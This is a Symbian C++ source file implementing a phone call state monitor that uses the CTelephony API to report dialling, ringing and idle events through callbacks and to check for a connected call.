/*
 * SlimMonitorPhoneCall.cpp
 *
 *  Created on: 19/apr/2011
 *      Author: Giovanna
 */

#include "SlimMonitorPhoneCall.h"


CSlimPhoneCallMonitor* CSlimPhoneCallMonitor::NewLC(MSlimCallMonCallBack &aCallBack)
	{
 	CSlimPhoneCallMonitor* self = new (ELeave) CSlimPhoneCallMonitor(aCallBack);
  	CleanupStack::PushL(self);
  	self->ConstructL();
  	return self;
	}


CSlimPhoneCallMonitor* CSlimPhoneCallMonitor::NewL(MSlimCallMonCallBack &aCallBack)
	{
 	CSlimPhoneCallMonitor* self = CSlimPhoneCallMonitor::NewLC(aCallBack);
  	CleanupStack::Pop(self);
  	return self;
	}


CSlimPhoneCallMonitor::CSlimPhoneCallMonitor(MSlimCallMonCallBack &aCallBack)
:CActive(EPriorityStandard),iCallBack(aCallBack),iCallStatusPckg(iCallStatus)
	{
	
	}


CSlimPhoneCallMonitor::~CSlimPhoneCallMonitor()
	{
	// always cancel any pending request before deleting the objects
  	Cancel();
  	delete iTelephony;
  	__FLOG_CLOSE;
	}


void CSlimPhoneCallMonitor::ConstructL()
	{
	__FLOG_OPEN("HT", "CallStates.txt");
	__FLOG(_L("-------------"));
		
	// Active objects needs to be added to active scheduler
 	CActiveScheduler::Add(this);
  	iTelephony = CTelephony::NewL();// construct CTelephony
  	}

void CSlimPhoneCallMonitor::StartListeningForEvents()
	{
	if(IsActive())
		{
		Cancel();
		}
	
	if(iTelephony)
		{
		// ask CTelephony to notify when telephony stautus changes
		// RunL will be called when this happens
	  	iTelephony->NotifyChange(iStatus,CTelephony::EVoiceLineStatusChange,iCallStatusPckg);
	  	SetActive();// after starting the request AO needs to be set active
		}
	}
/*
-----------------------------------------------------------------------------
RunL is called by Active schduler when the requeststatus variable iStatus 
is set to something else than pending, function Int() can be then used
to determine if the request failed or succeeded
-----------------------------------------------------------------------------
*/ 
// remember that we are interested only into connected phone calls

void CSlimPhoneCallMonitor::RunL()
	{
  	CTelephony::TCallStatus status = iCallStatus.iStatus;
  	
  	__FLOG_1(_L("CallStatus: %d"),status);
  	
  	// use callback function to tell owner that call status has changed
  	//iCallBack.NotifyChangeInCallStatusL(status,errVal);
  	if(iStatus.Int() == KErrNone)
  		{
  		if(status == CTelephony::EStatusDialling)
  			{
  			iCallBack.NotifyDialling();
  			}
  		if(status == CTelephony::EStatusRinging)
  			{
			iCallBack.NotifyRinging();
  			}
  	
  		if(status == CTelephony::EStatusIdle)
  			{
  			iCallBack.NotifyIdle();
  			}
  		}
	StartListeningForEvents();
	}
/*
-----------------------------------------------------------------------------
newer call DoCancel in your code, just call Cancel() and let the
active scheduler handle calling this functions, if the AO is active
-----------------------------------------------------------------------------
*/ 
void CSlimPhoneCallMonitor::DoCancel()
	{
	if(iTelephony)
		{
		// since CTelephony implements many different functions
		// You need to specifying what you want to cancel
  		iTelephony->CancelAsync(CTelephony::EVoiceLineStatusChangeCancel);
		}
	}

/*
 * ActiveCall() detects if there's a connected call. Only in that case aNumber is meaningfull; and only 
 * in that case, if aNumber.Length() == 0, then aNumber is a private number.
 */
TBool CSlimPhoneCallMonitor::ActiveCall(TDes& aNumber)
	{
	CTelephony::TRemotePartyInfoV1 remInfoUse;
	CTelephony::TCallInfoV1		   callInfoUse;
	CTelephony::TCallSelectionV1   callSelectionUse;
	  		
	// we are interested only voice lines
	callSelectionUse.iLine = CTelephony::EVoiceLine;
	// and calls that are currently connected
	callSelectionUse.iSelect = CTelephony::EActiveCall;  //EHeldCall, EInProgressCall
	  		
	CTelephony::TRemotePartyInfoV1Pckg 	remParty(remInfoUse);
	CTelephony::TCallInfoV1Pckg 		callInfo(callInfoUse);
	CTelephony::TCallSelectionV1Pckg 	callSelection(callSelectionUse);
	  	
	// TCallRemoteIdentityStatus::ERemoteIdentityUnknown, ERemoteIdentityAvailable, ERemoteIdentitySuppressed
	if(iTelephony->GetCallInfo(callSelection,callInfo,remParty) == KErrNone)
		{
		return ETrue;
		}
	
	return EFalse;
	}

TInt CSlimPhoneCallMonitor::RunError(TInt /*aError*/)
	{
	return KErrNone;
	}


